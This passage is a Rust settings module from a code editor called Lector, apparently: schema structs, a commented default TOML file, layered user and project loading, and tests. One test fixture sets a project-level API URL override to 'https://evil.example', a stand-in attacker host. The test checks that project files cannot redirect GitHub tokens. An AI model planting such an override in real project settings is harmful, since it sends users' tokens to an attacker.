use serde::{Deserialize, Deserializer, Serialize};
use std::collections::BTreeMap;
use std::path::Path;

use crate::paths;

/// Light/dark selection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum ThemeMode {
    /// Follow the OS appearance.
    #[default]
    System,
    /// Always light.
    Light,
    /// Always dark.
    Dark,
}

/// Theme selection.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct ThemeSettings {
    /// system | light | dark
    pub mode: ThemeMode,
    /// Theme name used in light appearance.
    pub light: String,
    /// Theme name used in dark appearance.
    pub dark: String,
}

impl Default for ThemeSettings {
    fn default() -> Self {
        Self {
            mode: ThemeMode::System,
            light: "Lector Light".into(),
            dark: "Lector Dark".into(),
        }
    }
}

/// Whitespace rendering.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum ShowWhitespace {
    /// Only inside the selection.
    #[default]
    Selection,
    /// Never.
    None,
    /// Always.
    All,
}

/// Diff layout preference.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum DiffLayout {
    /// Choose from the available width.
    #[default]
    Auto,
    /// Side by side.
    Split,
    /// Single column.
    Unified,
}

/// Diff view options.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct DiffSettings {
    /// auto | split | unified
    pub layout: DiffLayout,
    /// Ignore whitespace-only changes.
    pub ignore_whitespace: bool,
    /// Unchanged lines shown around each hunk.
    pub context_lines: u32,
    /// Highlight changed words inside changed lines.
    pub word_diff: bool,
    /// Use a colorblind-safe added/removed palette.
    pub colorblind: bool,
}

impl Default for DiffSettings {
    fn default() -> Self {
        Self {
            layout: DiffLayout::Auto,
            ignore_whitespace: false,
            context_lines: 3,
            word_diff: true,
            colorblind: false,
        }
    }
}

/// File tree / loading options.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct FileSettings {
    /// Glob patterns hidden from the tree, finder and search.
    pub exclude: Vec<String>,
    /// Show dotfiles.
    pub show_hidden: bool,
    /// Show gitignored files (dimmed).
    pub show_ignored: bool,
    /// Files at least this large (MiB) are memory-mapped.
    pub large_file_threshold_mb: u64,
}

impl Default for FileSettings {
    fn default() -> Self {
        Self {
            exclude: vec![".git".into(), ".DS_Store".into(), "Thumbs.db".into()],
            show_hidden: true,
            show_ignored: false,
            large_file_threshold_mb: 32,
        }
    }
}

/// Per-server override.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct ServerOverride {
    /// Replacement executable.
    pub command: Option<String>,
    /// Replacement arguments.
    pub args: Option<Vec<String>>,
    /// Set false to disable this server.
    pub enabled: Option<bool>,
}

/// Language server options.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct LspSettings {
    /// Master switch.
    pub enabled: bool,
    /// Overrides keyed by built-in server name (e.g. `rust-analyzer`).
    pub servers: BTreeMap<String, ServerOverride>,
}

impl Default for LspSettings {
    fn default() -> Self {
        Self {
            enabled: true,
            servers: BTreeMap::new(),
        }
    }
}

/// Git integration options.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct GitSettings {
    /// Show blame in the gutter.
    pub blame_gutter: bool,
    /// Show change marks in the gutter.
    pub show_gutter: bool,
    /// Ask before discarding changes (files or hunks). Off by default since v0.4: Lector backs the
    /// changes up first and shows an Undo toast instead. Discards still ask when the backup
    /// (shadow repository) is unavailable.
    pub confirm_discard: bool,
    /// Add a `Signed-off-by` trailer to commits.
    pub commit_sign_off: bool,
    /// Column of the guide shown in the commit message editor (0 = none).
    pub commit_message_ruler: u32,
    /// Fetch every remote in the background (v0.7). Off by default: nothing runs on a timer
    /// unless opted in. User-level only (ignored in project settings).
    pub auto_fetch: AutoFetch,
}

impl Default for GitSettings {
    fn default() -> Self {
        Self {
            blame_gutter: false,
            show_gutter: true,
            confirm_discard: false,
            commit_sign_off: false,
            commit_message_ruler: 72,
            auto_fetch: AutoFetch::Off,
        }
    }
}

/// `git.auto_fetch`: `"off"` (default) or a number of minutes between background fetches.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum AutoFetch {
    /// Never fetch on a timer.
    #[default]
    Off,
    /// Fetch all remotes every this many minutes (at least 1).
    Minutes(u32),
}

impl AutoFetch {
    /// The interval, or `None` when off.
    pub fn interval(self) -> Option<std::time::Duration> {
        match self {
            AutoFetch::Off => None,
            AutoFetch::Minutes(m) => Some(std::time::Duration::from_secs(u64::from(m.max(1)) * 60)),
        }
    }
}

impl Serialize for AutoFetch {
    fn serialize<S: serde::Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
        match self {
            AutoFetch::Off => s.serialize_str("off"),
            AutoFetch::Minutes(m) => s.serialize_u32(*m),
        }
    }
}

impl<'de> Deserialize<'de> for AutoFetch {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        #[derive(Deserialize)]
        #[serde(untagged)]
        enum Raw {
            Minutes(i64),
            Text(String),
            Flag(bool),
        }
        match Raw::deserialize(d)? {
            Raw::Minutes(m) if m <= 0 => Ok(AutoFetch::Off),
            Raw::Minutes(m) => Ok(AutoFetch::Minutes(u32::try_from(m).unwrap_or(u32::MAX))),
            Raw::Flag(false) => Ok(AutoFetch::Off),
            Raw::Text(t) if t.eq_ignore_ascii_case("off") => Ok(AutoFetch::Off),
            Raw::Text(t) => t
                .trim()
                .parse::<u32>()
                .map(|m| {
                    if m == 0 {
                        AutoFetch::Off
                    } else {
                        AutoFetch::Minutes(m)
                    }
                })
                .map_err(|_| {
                    serde::de::Error::custom(format!(
                        "git.auto_fetch must be \"off\" or a number of minutes, not {t:?}"
                    ))
                }),
            Raw::Flag(true) => Err(serde::de::Error::custom(
                "git.auto_fetch must be \"off\" or a number of minutes (e.g. 15)",
            )),
        }
    }
}

/// When modified files are saved automatically.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum AutoSave {
    /// Only on explicit save.
    #[default]
    Off,
    /// After `auto_save_delay_ms` without typing.
    AfterDelay,
    /// When the window or the tab loses focus.
    OnFocusChange,
}

/// Editing options (v0.3+). Lector opens files read-only unless `read_only = false`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct EditorSettings {
    /// Open files read-only (editing disabled). Toggle per tab with "Toggle Read-Only".
    pub read_only: bool,
    /// Insert spaces for Tab; `None` follows the file's detected indentation.
    pub insert_spaces: Option<bool>,
    /// Keep the indentation of the previous line on Enter (and indent after `{`, `:` ...).
    pub auto_indent: bool,
    /// Insert the closing bracket or quote when typing an opening one.
    pub auto_close_brackets: bool,
    /// Automatic saving.
    pub auto_save: AutoSave,
    /// Delay for `auto_save = "after_delay"`.
    pub auto_save_delay_ms: u64,
    /// Format with the language server when saving.
    pub format_on_save: bool,
    /// Remove trailing whitespace when saving.
    pub trim_trailing_whitespace: bool,
    /// End files with exactly one newline when saving.
    pub ensure_final_newline: bool,
    /// Code completion from language servers (v0.7).
    pub completion: CompletionSettings,
    /// Signature help from language servers (v0.7).
    pub signature_help: SignatureHelpSettings,
}

/// Whether accepting a completion replaces only the text before the cursor or the whole word.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum CompletionInsertMode {
    /// Insert at the cursor; the text after it stays.
    #[default]
    Insert,
    /// Replace the word under the cursor, including the part after the cursor.
    Replace,
}

/// Completion options (`[editor.completion]`). Suggestions only ever come from language
/// servers. These settings change how Lector talks to them, never which program runs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct CompletionSettings {
    /// Show completions (typing, trigger characters and Ctrl+Space).
    pub enabled: bool,
    /// Accept snippet syntax from servers (tab stops, placeholders). Off: servers are told
    /// snippets are unsupported and send plain text. Read when a server starts.
    pub snippets: bool,
    /// "insert" or "replace" (see [`CompletionInsertMode`]).
    pub insert_mode: CompletionInsertMode,
    /// Enter accepts the selected suggestion (Tab always does). Off: Enter closes the list and
    /// inserts a line break.
    pub accept_on_enter: bool,
}

impl Default for CompletionSettings {
    fn default() -> Self {
        Self {
            enabled: true,
            snippets: false,
            insert_mode: CompletionInsertMode::Insert,
            accept_on_enter: true,
        }
    }
}

/// Signature help options (`[editor.signature_help]`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct SignatureHelpSettings {
    /// Show the parameter popup while typing a call (and on its command).
    pub enabled: bool,
}

impl Default for SignatureHelpSettings {
    fn default() -> Self {
        Self { enabled: true }
    }
}

impl Default for EditorSettings {
    fn default() -> Self {
        Self {
            read_only: false,
            insert_spaces: None,
            auto_indent: true,
            auto_close_brackets: true,
            auto_save: AutoSave::Off,
            auto_save_delay_ms: 1000,
            format_on_save: false,
            trim_trailing_whitespace: false,
            ensure_final_newline: false,
            completion: CompletionSettings::default(),
            signature_help: SignatureHelpSettings::default(),
        }
    }
}

/// Session restore options.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct SessionSettings {
    /// Reopen tabs from the last session.
    pub restore: bool,
}

impl Default for SessionSettings {
    fn default() -> Self {
        Self { restore: true }
    }
}

/// One coding agent speaking the Agent Client Protocol over stdio (`[[agent.servers]]`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct AgentServer {
    /// Name shown in the agent picker ("Gemini").
    pub name: String,
    /// Program to run (looked up on `PATH`).
    pub command: String,
    /// Its arguments.
    pub args: Vec<String>,
    /// Extra environment variables.
    pub env: BTreeMap<String, String>,
}

/// Review options (v0.4 review UX).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ReviewSettings {
    /// Order files by risk ("needs attention" first) in the review tab and the Changes panel;
    /// generated and lock files go to a collapsed low-risk group.
    pub risk_order: bool,
    /// Detect code that was moved (within a file or between the files of a change) and show it
    /// dimmed in diffs.
    pub detect_moved: bool,
    /// Render syntax-aware (structural) diffs when `diff::ToggleStructural` is on and the file
    /// is small enough.
    pub structural: bool,
}

impl Default for ReviewSettings {
    fn default() -> Self {
        Self {
            risk_order: true,
            detect_moved: true,
            structural: false,
        }
    }
}

/// Agent sessions (v0.5).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct AgentSettings {
    /// Agents from the user's settings. Known agents found on `PATH` (Gemini CLI,
    /// `claude-code-acp`, `codex-acp`) are offered as well. Only read from the user's
    /// settings file: a project cannot define commands to run.
    pub servers: Vec<AgentServer>,
    /// Snapshot the working tree before and after every turn (review and undo per turn).
    pub checkpoints: bool,
    /// Let agents read files in the project without asking.
    pub auto_allow_reads: bool,
}

impl Default for AgentSettings {
    fn default() -> Self {
        Self {
            servers: Vec::new(),
            checkpoints: true,
            auto_allow_reads: true,
        }
    }
}

/// Accessibility-related interface options (v0.4).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct UiSettings {
    /// Scale of the whole interface (menus, panels, dialogs, status bar), 0.75 to 2.0.
    /// Separate from the code font size (`buffer_font_size`, View > Zoom In/Out).
    pub scale: f32,
    /// Turn off caret blinking, animated scrolling, toast slide-ins and spinner rotation.
    /// Unset follows the operating system's "reduce motion" preference where Lector can
    /// read it (macOS, GNOME/GTK); otherwise motion stays on.
    pub reduce_motion: Option<bool>,
}

impl UiSettings {
    /// Smallest accepted `scale`.
    pub const MIN_SCALE: f32 = 0.75;
    /// Largest accepted `scale`.
    pub const MAX_SCALE: f32 = 2.0;

    /// `scale` clamped to the supported range (NaN becomes 1.0).
    pub fn clamped_scale(&self) -> f32 {
        if self.scale.is_finite() {
            self.scale.clamp(Self::MIN_SCALE, Self::MAX_SCALE)
        } else {
            1.0
        }
    }
}

impl Default for UiSettings {
    fn default() -> Self {
        Self {
            scale: 1.0,
            reduce_motion: None,
        }
    }
}

/// Code hosts (v0.6, `lector-forge`): which hosts are GitHub Enterprise / self-hosted GitLab,
/// API URL overrides and the default pull-request filter. Only the user's own settings file
/// may set it (a project's `.lector/settings.toml` could otherwise send tokens elsewhere).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ForgeSettings {
    /// GitHub Enterprise hosts (github.com is always known).
    pub github_hosts: Vec<String>,
    /// Self-hosted GitLab hosts (gitlab.com is always known).
    pub gitlab_hosts: Vec<String>,
    /// API base URL overrides by host.
    pub api_urls: BTreeMap<String, String>,
    /// Pull Requests panel filter: "review_requested", "mine" or "all".
    pub default_filter: String,
}

impl Default for ForgeSettings {
    fn default() -> Self {
        Self {
            github_hosts: Vec::new(),
            gitlab_hosts: Vec::new(),
            api_urls: BTreeMap::new(),
            default_filter: "review_requested".into(),
        }
    }
}

/// Accepts either `"Font"` or `["Font A", "Font B"]`.
fn string_or_list<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<String>, D::Error> {
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum OneOrMany {
        One(String),
        Many(Vec<String>),
    }
    Ok(match OneOrMany::deserialize(d)? {
        OneOrMany::One(s) => vec![s],
        OneOrMany::Many(v) => v,
    })
}

/// All user-facing settings. Every field has a default; unknown keys are
/// reported as warnings by [`load_settings`], never as errors.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Settings {
    /// UI font family.
    pub ui_font_family: String,
    /// UI font size in px.
    pub ui_font_size: f32,
    /// Code font fallback chain, first available wins.
    #[serde(deserialize_with = "string_or_list")]
    pub buffer_font_family: Vec<String>,
    /// Code font size in px.
    pub buffer_font_size: f32,
    /// Line height multiplier.
    pub line_height: f32,
    /// Enable font ligatures.
    pub ligatures: bool,
    /// Theme selection.
    pub theme: ThemeSettings,
    /// Soft-wrap long lines.
    pub soft_wrap: bool,
    /// Tab width in columns.
    pub tab_size: u32,
    /// Show the minimap.
    pub show_minimap: bool,
    /// Show indent guides.
    pub show_indent_guides: bool,
    /// Pin enclosing scopes at the top while scrolling.
    pub sticky_scroll: bool,
    /// Whitespace rendering.
    pub show_whitespace: ShowWhitespace,
    /// Blink the cursor.
    pub cursor_blink: bool,
    /// Allow scrolling past the last line.
    pub scroll_beyond_last_line: bool,
    /// Diff options.
    pub diff: DiffSettings,
    /// File options.
    pub files: FileSettings,
    /// Language server options.
    pub lsp: LspSettings,
    /// Git options.
    pub git: GitSettings,
    /// Editing (v0.3+).
    pub editor: EditorSettings,
    /// Session options.
    pub session: SessionSettings,
    /// Interface scale and motion (accessibility, v0.4).
    pub ui: UiSettings,
    /// Review options (risk order, moved code, structural diffs).
    pub review: ReviewSettings,
    /// Coding agents (v0.5, `lector-agent`).
    pub agent: AgentSettings,
    /// Code hosts (v0.6, `lector-forge`).
    pub forge: ForgeSettings,
    /// Update check (v0.7): off until the user opts in.
    pub updates: crate::updates::UpdatesSettings,
    /// Integrated terminal (v0.7, `lector-ui-terminal`).
    pub terminal: crate::terminal::TerminalSettings,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            ui_font_family: "Inter".into(),
            ui_font_size: 13.0,
            buffer_font_family: vec![
                "JetBrains Mono".into(),
                "Menlo".into(),
                "Consolas".into(),
                "DejaVu Sans Mono".into(),
                "monospace".into(),
            ],
            buffer_font_size: 13.5,
            line_height: 1.5,
            ligatures: false,
            theme: ThemeSettings::default(),
            soft_wrap: false,
            tab_size: 4,
            show_minimap: true,
            show_indent_guides: true,
            sticky_scroll: true,
            show_whitespace: ShowWhitespace::Selection,
            cursor_blink: false,
            scroll_beyond_last_line: true,
            diff: DiffSettings::default(),
            files: FileSettings::default(),
            lsp: LspSettings::default(),
            git: GitSettings::default(),
            editor: EditorSettings::default(),
            session: SessionSettings::default(),
            ui: UiSettings::default(),
            review: ReviewSettings::default(),
            agent: AgentSettings::default(),
            forge: ForgeSettings::default(),
            updates: crate::updates::UpdatesSettings::default(),
            terminal: crate::terminal::TerminalSettings::default(),
        }
    }
}

const DEFAULT_SETTINGS_TOML: &str = r#"# Lector settings. Every key is shown with its default value.
# Edit your copy (`settings.toml` in the config dir); a project may override
# values in `<project>/.lector/settings.toml` (except [forge], [updates], agent servers,
# the terminal shell/profiles/env and language-server commands, which only this file may set). Unknown keys only
# produce warnings.

# --- Fonts ---------------------------------------------------------------
# Interface font (falls back to the system UI font if not installed).
ui_font_family = "Inter"
# Interface font size in px.
ui_font_size = 13.0
# Code font: a single name or a fallback chain; the first installed one wins.
buffer_font_family = ["JetBrains Mono", "Menlo", "Consolas", "DejaVu Sans Mono", "monospace"]
# Code font size in px.
buffer_font_size = 13.5
# Line height as a multiple of the font size.
line_height = 1.5
# Render font ligatures (e.g. => as an arrow).
ligatures = false

# --- Code view -----------------------------------------------------------
# Wrap long lines instead of scrolling horizontally.
soft_wrap = false
# Width of a tab character in columns.
tab_size = 4
# Show the minimap on the right edge.
show_minimap = true
# Draw vertical indent guides.
show_indent_guides = true
# Pin the enclosing function/class headers while scrolling.
sticky_scroll = true
# Show whitespace characters: "selection", "none" or "all".
show_whitespace = "selection"
# Blink the cursor.
cursor_blink = false
# Allow scrolling past the end of the file.
scroll_beyond_last_line = true

[theme]
# "system" follows the OS; or force "light" / "dark".
mode = "system"
# Theme used in light appearance.
light = "Lector Light"
# Theme used in dark appearance.
dark = "Lector Dark"

[diff]
# "auto" picks split or unified from the width; or "split" / "unified".
layout = "auto"
# Hide whitespace-only changes.
ignore_whitespace = false
# Unchanged lines shown around each change.
context_lines = 3
# Highlight changed words within a changed line.
word_diff = true
# Use a colorblind-safe palette for added/removed.
colorblind = false

[files]
# Glob patterns hidden from the tree, file finder and search.
exclude = [".git", ".DS_Store", "Thumbs.db"]
# Show dotfiles.
show_hidden = true
# Show gitignored files (dimmed).
show_ignored = false
# Files this large (in MiB) or larger are memory-mapped instead of loaded.
large_file_threshold_mb = 32

[lsp]
# Use language servers (hover, go to definition, references, symbols).
enabled = true
# Lector never writes to your project, so servers that build into the project
# directory (jdtls, kotlin-language-server, sourcekit-lsp, csharp-ls) only start
# with `enabled = true`, and rust-analyzer runs without dependency resolution,
# build scripts or `cargo check` (they would write Cargo.lock / target/).
# Per-server overrides, keyed by server name. Example:
# [lsp.servers.rust-analyzer]
# command = "/opt/ra/rust-analyzer"
# args = []
# enabled = true

[git]
# Show blame information in the gutter.
blame_gutter = false
# Show added/modified/deleted marks in the gutter.
show_gutter = true
# Ask before discarding changes (files or hunks). Off: Lector backs them up and offers Undo
# (Activity log, ctrl/cmd-alt-z); it still asks when it cannot back up.
confirm_discard = false
# Add a "Signed-off-by" trailer to commits.
commit_sign_off = false
# Guide column in the commit message editor (0 = none).
commit_message_ruler = 72
# Fetch all remotes in the background: "off" (default) or every N minutes, e.g. 15.
# Only from your own settings.toml (ignored in project settings).
auto_fetch = "off"

[editor]
# Open files read-only. Each tab can still be toggled with "Toggle Read-Only".
read_only = false
# Insert spaces for Tab. Leave unset to follow each file's detected indentation.
# insert_spaces = true
# Keep (and increase after `{`, `:`, ...) indentation on Enter.
auto_indent = true
# Insert the closing bracket or quote when typing an opening one.
auto_close_brackets = true
# "off", "after_delay" or "on_focus_change".
auto_save = "off"
# Delay for auto_save = "after_delay", in milliseconds.
auto_save_delay_ms = 1000
# Format with the language server on save.
format_on_save = false
# Remove trailing whitespace on save.
trim_trailing_whitespace = false
# End files with exactly one newline on save.
ensure_final_newline = false

[editor.completion]
# Suggestions while typing, after trigger characters and on Ctrl+Space. They always come
# from the language server of the file; there is no other source.
enabled = true
# Let servers send snippets (tab stops and placeholders). Off: plain text only. Takes
# effect for language servers started after the change.
snippets = false
# "insert" keeps the text after the cursor; "replace" overwrites the rest of the word.
insert_mode = "insert"
# Enter accepts the selected suggestion (Tab always does). false: Enter closes the list and
# starts a new line.
accept_on_enter = true

[editor.signature_help]
# Show the parameter popup while typing a call.
enabled = true

[session]
# Reopen the tabs and layout from the last session.
restore = true

[ui]
# Scale of the whole interface, 0.75 to 2.0 (View > Zoom UI In / Out / Reset).
# The code font is separate: buffer_font_size and View > Zoom In / Out.
scale = 1.0
# Turn off caret blinking, animated scrolling, toast slide-ins and spinner rotation.
# Left unset, Lector follows the operating system's "reduce motion" preference where it
# can read it (macOS, GNOME/GTK) and otherwise keeps motion on. Set true or false to force.
# reduce_motion = false

[review]
# Order files by risk ("needs attention" first) in the review tab and the Changes panel.
# Generated and lock files go to a collapsed "Low-risk & generated" group.
risk_order = true
# Dim code that was only moved (within a file or between files of a change) and label where it
# came from. Toggle per view with "Toggle Moved Code".
detect_moved = true
# Syntax-aware diff highlights ("Toggle Structural Diff"); falls back to the line diff when a
# file is too big.
structural = false

[agent]
# Snapshot the working tree before and after every agent turn, so each turn can be
# reviewed as a changeset and undone.
checkpoints = true
# Let agents read files inside the project without asking.
auto_allow_reads = true
# Agents speaking the Agent Client Protocol. Gemini CLI, claude-code-acp and codex-acp
# are offered automatically when found on PATH. Only your own settings file may add
# agents (a project's .lector/settings.toml cannot). Example:
# [[agent.servers]]
# name = "Gemini"
# command = "gemini"
# args = ["--experimental-acp"]
# env = { GEMINI_API_KEY = "..." }

[forge]
# Pull requests (GitHub) and merge requests (GitLab). github.com and gitlab.com are always
# known; list GitHub Enterprise and self-hosted GitLab hosts here. Tokens come from
# GITHUB_TOKEN / GH_TOKEN / GITLAB_TOKEN, then `gh` / `glab`, then the OS keychain.
# Only your own settings file may set [forge].
github_hosts = []
gitlab_hosts = []
# Default filter of the Pull Requests panel: "review_requested", "mine" or "all".
default_filter = "review_requested"
# API URL overrides by host, e.g. a proxy:
# [forge.api_urls]
# "github.example.com" = "https://github.example.com/api/v3"

[updates]
# Check GitHub for new Lector releases: "off" (default; Lector never contacts the network by
# itself) or "on" (at most one request per 24 hours; no personal data is sent). "Check for
# updates now" always works. Lector only tells you; it never downloads or installs by itself.
# Only your own settings file may set [updates].
check = "off"
# "stable" (default) or "preview" (also pre-releases).
channel = "stable"

[terminal]
# The integrated terminal (View > Terminal, ctrl+`). The shell, its arguments, profiles and
# environment can only be set here, never in a project's .lector/settings.toml.
# Shell; unset = $SHELL (Linux/macOS) or pwsh / powershell / cmd (Windows).
# shell = { program = "/bin/zsh", args = ["-l"] }
# Named profiles ("New Terminal with Profile"); default_profile picks the one "New Terminal" uses.
# [[terminal.profiles]]
# name = "fish"
# program = "fish"
# args = []
# env = { FOO = "1" }
# default_profile = "fish"
# Extra environment variables for every terminal.
# [terminal.env]
# EDITOR = "vim"
# Font family, size (px) and line height; unset = the code font and size, line height 1.2.
# font_family = "JetBrains Mono"
# font_size = 13.0
# line_height = 1.2
# Lines of scrollback kept per terminal.
scrollback = 10000
# "block", "beam" or "underline".
cursor_style = "block"
# Blink the cursor (off when reduce motion is on).
cursor_blink = true
# Copy the selection to the clipboard as soon as it is made.
copy_on_select = false
# Linux/Windows: ctrl+c copies when text is selected (otherwise it always interrupts).
# ctrl+shift+c always copies.
ctrl_c_copies_selection = false
# macOS: Option sends Meta (ESC prefix) instead of typing special characters.
option_as_meta = false
# Ask before pasting several lines into a program that did not enable bracketed paste.
confirm_multiline_paste = true
# Where "New Terminal" starts: "project" (the project root) or "active_file" (its folder).
new_terminal_cwd = "project"
# Report the working directory and command marks (bash, zsh, fish; nothing is written to
# your shell configuration).
shell_integration = true
# Reopen terminal tabs in their last folder (fresh shells, no scrollback).
restore = true
# Close a terminal tab as soon as its shell exits.
close_on_exit = false
"#;

/// A fully commented TOML file that parses to [`Settings::default`].
pub fn default_settings_toml() -> &'static str {
    DEFAULT_SETTINGS_TOML
}

/// Recursively merge `over` into `base` (tables merge, everything else replaces).
fn deep_merge(base: &mut toml::Table, over: toml::Table) {
    for (k, v) in over {
        match (base.get_mut(&k), v) {
            (Some(toml::Value::Table(b)), toml::Value::Table(o)) => deep_merge(b, o),
            (_, v) => {
                base.insert(k, v);
            }
        }
    }
}

/// Parse one layer, collecting unknown-key warnings. `None` if it is unusable.
fn parse_layer(label: &str, text: &str, warnings: &mut Vec<String>) -> Option<toml::Table> {
    let table: toml::Table = match text.parse() {
        Ok(t) => t,
        Err(e) => {
            warnings.push(format!("{label}: {e}"));
            return None;
        }
    };
    let mut ignored = Vec::new();
    let res: Result<Settings, _> = serde_ignored::deserialize(table.clone(), |p| {
        ignored.push(p.to_string());
    });
    match res {
        Ok(_) => {
            for key in ignored {
                warnings.push(format!("{label}: unknown setting `{key}`"));
            }
            Some(table)
        }
        Err(e) => {
            warnings.push(format!("{label}: {e}; layer ignored"));
            None
        }
    }
}

fn read_layer(path: &Path, warnings: &mut Vec<String>) -> Option<toml::Table> {
    match std::fs::read_to_string(path) {
        Ok(text) => parse_layer(&path.display().to_string(), &text, warnings),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
        Err(e) => {
            warnings.push(format!("{}: {e}", path.display()));
            None
        }
    }
}

/// Removes from a project layer what only the user's own settings may set: code hosts
/// (`[forge]`: tokens could be sent elsewhere), agent commands (`agent.servers`) and
/// language-server commands (`lsp.servers.*.command` / `args`, and `enabled = true`, which
/// turns on servers that write into the project). Opening a project must never run a
/// program the project chose.
fn strip_user_only(layer: &mut toml::Table, file: &Path, warnings: &mut Vec<String>) {
    let mut dropped = Vec::new();
    if layer.remove("forge").is_some() {
        dropped.push("[forge]".to_string());
    }
    if layer.remove("updates").is_some() {
        dropped.push("[updates]".to_string());
    }
    if let Some(toml::Value::Table(git)) = layer.get_mut("git") {
        if git.remove("auto_fetch").is_some() {
            dropped.push("git.auto_fetch".to_string());
        }
    }
    if let Some(toml::Value::Table(terminal)) = layer.get_mut("terminal") {
        for key in crate::terminal::USER_ONLY_TERMINAL_KEYS {
            if terminal.remove(*key).is_some() {
                dropped.push(format!("terminal.{key}"));
            }
        }
    }
    if let Some(toml::Value::Table(agent)) = layer.get_mut("agent") {
        if agent.remove("servers").is_some() {
            dropped.push("agent.servers".to_string());
        }
    }
    if let Some(toml::Value::Table(lsp)) = layer.get_mut("lsp") {
        if let Some(toml::Value::Table(servers)) = lsp.get_mut("servers") {
            for (name, server) in servers.iter_mut() {
                let toml::Value::Table(server) = server else {
                    continue;
                };
                for key in ["command", "args"] {
                    if server.remove(key).is_some() {
                        dropped.push(format!("lsp.servers.{name}.{key}"));
                    }
                }
                if server.get("enabled") == Some(&toml::Value::Boolean(true)) {
                    server.remove("enabled");
                    dropped.push(format!("lsp.servers.{name}.enabled = true"));
                }
            }
        }
    }
    for key in dropped {
        warnings.push(format!(
            "{}: {key} is ignored in project settings (set it in your own settings.toml)",
            file.display()
        ));
    }
}

pub(crate) fn load_settings_from(
    user_file: &Path,
    project_root: Option<&Path>,
) -> (Settings, Vec<String>) {
    let mut warnings = Vec::new();
    let mut merged = toml::Table::new();
    let project_file = project_root.map(|r| r.join(".lector").join("settings.toml"));
    for (i, file) in std::iter::once(user_file.to_path_buf())
        .chain(project_file)
        .enumerate()
    {
        if let Some(mut layer) = read_layer(&file, &mut warnings) {
            if i > 0 {
                strip_user_only(&mut layer, &file, &mut warnings);
            }
            deep_merge(&mut merged, layer);
        }
    }
    match Settings::deserialize(merged) {
        Ok(s) => (s, warnings),
        Err(e) => {
            warnings.push(format!("settings: {e}; using defaults"));
            (Settings::default(), warnings)
        }
    }
}

/// Defaults, then the user's `settings.toml`, then `<project>/.lector/settings.toml`.
pub fn load_settings_for(project_root: Option<&Path>) -> (Settings, Vec<String>) {
    load_settings_from(&paths::settings_file(), project_root)
}

/// [`load_settings_for`] without a project.
pub fn load_settings() -> (Settings, Vec<String>) {
    load_settings_for(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ui_scale_and_reduce_motion() {
        let d = Settings::default();
        assert_eq!(d.ui.scale, 1.0);
        assert_eq!(d.ui.reduce_motion, None, "unset follows the OS");
        let s: Settings = toml::from_str("[ui]\nscale = 1.5\nreduce_motion = true\n").unwrap();
        assert_eq!(s.ui.clamped_scale(), 1.5);
        assert_eq!(s.ui.reduce_motion, Some(true));
        for (raw, want) in [(0.1, 0.75), (9.0, 2.0), (1.25, 1.25), (f32::NAN, 1.0)] {
            let ui = UiSettings {
                scale: raw,
                ..UiSettings::default()
            };
            assert_eq!(ui.clamped_scale(), want, "{raw}");
        }
        // The commented default file documents both keys.
        assert!(default_settings_toml().contains("[ui]"));
        assert!(default_settings_toml().contains("# reduce_motion = false"));
    }

    #[test]
    fn forge_settings_user_only() {
        let d = Settings::default().forge;
        assert_eq!(d.default_filter, "review_requested");
        assert!(d.github_hosts.is_empty() && d.api_urls.is_empty());
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(
            &user,
            "[forge]\ngitlab_hosts = [\"git.corp\"]\ndefault_filter = \"mine\"\n[forge.api_urls]\n\"github.com\" = \"http://127.0.0.1:9\"\n",
        )
        .unwrap();
        let project = dir.path().join("p");
        std::fs::create_dir_all(project.join(".lector")).unwrap();
        std::fs::write(
            project.join(".lector/settings.toml"),
            "[forge.api_urls]\n\"github.com\" = \"https://evil.example\"\n",
        )
        .unwrap();
        let (s, w) = load_settings_from(&user, Some(&project));
        assert_eq!(s.forge.gitlab_hosts, vec!["git.corp".to_string()]);
        assert_eq!(s.forge.default_filter, "mine");
        assert_eq!(s.forge.api_urls["github.com"], "http://127.0.0.1:9");
        assert!(w.iter().any(|w| w.contains("[forge] is ignored")), "{w:?}");
    }

    #[test]
